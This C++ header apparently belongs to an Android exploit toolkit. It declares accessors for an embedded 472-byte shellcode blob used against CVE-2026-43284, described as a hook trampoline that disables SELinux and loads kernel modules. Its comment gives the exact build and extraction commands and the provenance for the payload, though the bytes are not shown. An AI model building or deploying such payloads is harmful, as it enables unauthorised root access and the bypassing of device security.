#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_EMBED_LIBCXX_BLOB_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_EMBED_LIBCXX_BLOB_HPP

/* CVE-2026-43284 libc++ sentry hook payload: the upstream DirtyFrag `libcxx.S`
 * (the mutex / SELinux / insmod trampoline the sentry branch lands in).
 *
 * Provenance (read-only vendored reference plan, independent of the running
 * device):
 *   source      upstream ankitrawatgit/DirtyFrag-Android-Root-Jailbreak
 *               usermode/ankit/libcxx.S, upstream commit
 *               de2ab7be69dc159af508d584523fd4d5c0b7cc7a
 *               (vendored into third_party/dirtyfrag at c8dddde)
 *   build       NDK 30.0.16248370, from usermode/ankit/:
 *                 aarch64-linux-android30-clang --target=aarch64-linux-android30 \
 *                   -c libcxx.S -o libcxx.o -I .
 *                 llvm-objcopy -O binary --only-section=.data libcxx.o libcxx.bin
 *                 python3 -c 'import sys;d=open("libcxx.bin","rb").read(); \
 *                   open("libcxx.raw","wb").write(d[:472])'
 *               The blob is the contiguous `.data` image [libcxx_data,
 *               libcxx_data + libcxx_len) with libcxx_len = libcxx_end -
 *               libcxx_data = 472; it is zero-padded here to 480.
 *   size        472 bytes, zero-padded to 480 (16-byte alignment)
 *   sha256      d226d2e7883d3eba60d4e12f6707b2830c11a4a1d2e1e492d01bac6fdd245aa7
 *               (over the 472 raw bytes, as assembled from the vendored source)
 *
 * The bytes are a read-only template; steps::libcxx_shellcode_template() names
 * the parameter slots and hook_patch builds a fresh buffer per run. Nothing
 * here parses or executes the blob. ADR-0004 R1: no pipeline/ include. */

#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43284::embed {

    inline constexpr std::size_t kLibcxxSize = 472U;
    inline constexpr std::size_t kLibcxxPaddedSize = 480U;
    inline constexpr char kLibcxxSha256[] =
            "d226d2e7883d3eba60d4e12f6707b2830c11a4a1d2e1e492d01bac6fdd245aa7";

    [[nodiscard]] const std::uint8_t *libcxx_bytes() noexcept;
    [[nodiscard]] std::size_t libcxx_size() noexcept;
    [[nodiscard]] std::size_t libcxx_padded_size() noexcept;

} // namespace ghostlock::backend::cve_2026_43284::embed

#endif
